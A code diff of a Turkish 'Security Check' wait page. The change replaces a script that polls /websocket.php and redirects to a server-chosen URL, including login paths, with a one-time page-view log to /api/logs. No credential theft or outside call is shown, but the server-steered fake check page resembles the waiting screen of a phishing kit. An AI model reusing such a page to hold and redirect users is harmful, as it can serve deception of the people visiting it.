@@ -6,7 +6,7 @@
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Güvenlik Kontrolü</title>
+  <title>Wait | Güvenlik Kontrolü</title>
   <link rel="shortcut icon" type="image/x-icon" href="../assets/images/favicon.ico">
   <link rel="stylesheet" href="../assets/css/style.css">
   <style>
@@ -327,23 +327,28 @@
     <img src="../assets/images/loading.svg" alt="loading">
   </div>
   <script>
-    function b_xhr() {
-      fetch("/websocket.php", {
-          method: "POST"
-        })
-        .then((y) => y.json())
-        .then((m) => {
-          if (m.success) {
-            let u = m.success;
-            if (u.includes('login')) {
-              u = '../' + u;
-            }
-            window.location.href = u;
-          }
-        });
+    function logWaitPage() {
+      const payload = { page: 'wait' };
+      try {
+        const body = JSON.stringify(payload);
+        if (navigator.sendBeacon) {
+          const blob = new Blob([body], { type: 'application/json' });
+          navigator.sendBeacon('/api/logs', blob);
+        } else {
+          fetch('/api/logs', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body
+          }).catch(err => console.error('Wait log failed', err));
+        }
+      } catch (err) {
+        console.error('Wait log error', err);
+      }
     }
 
-    setInterval(b_xhr, 1500);
+    logWaitPage();
+
+
 
     const waitStatusDot = document.getElementById('waitStatusDot');
     const waitStatusText = document.getElementById('waitStatusText');
